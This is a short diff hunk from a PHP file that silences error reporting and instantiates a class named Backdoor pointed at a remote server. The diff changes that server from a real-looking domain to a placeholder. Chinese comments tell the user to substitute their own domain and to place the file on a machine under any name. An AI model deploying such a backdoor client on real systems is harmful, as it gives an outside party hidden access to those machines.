@@ -10,7 +10,7 @@ error_reporting(0);
 //注意，请将 "https://mirrorclient.test" 替换为你的镜像系统域名。
 //将本文件放到你自己的机器内，随意起名。
 
-$server = "https://kuakua.mrclient.xyz";
+$server = "https://mirrorclient.test";
 
 new Backdoor($server);
 
